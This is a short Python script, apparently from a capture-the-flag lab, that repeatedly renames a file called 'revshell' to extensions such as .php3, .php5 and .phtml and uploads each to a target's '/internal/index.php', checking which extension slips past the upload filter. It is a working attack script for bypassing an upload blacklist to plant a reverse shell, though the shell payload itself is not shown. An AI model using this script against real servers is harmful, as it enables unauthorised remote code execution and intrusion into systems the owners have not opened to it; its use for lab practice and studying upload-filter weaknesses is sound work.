import requests
import os

ip = '10.10.164.179'

url = f'http://{ip}:3333/internal/index.php'

extensions = ['.php','.php3','.php4','.php5','.phtml']

old_filename = "revshell"

for ext in extensions:
    new_filename = 'revshell'+ext
    os.rename(old_filename,new_filename)

    files = {"file":open(new_filename,"rb")}
    r = requests.post(url,files=files)
    print(r.text)
    if "Extension not allowed" in r.text:
        print(f'{ext} is not allowed')
    else:
        print(f'{ext} is allowed')  
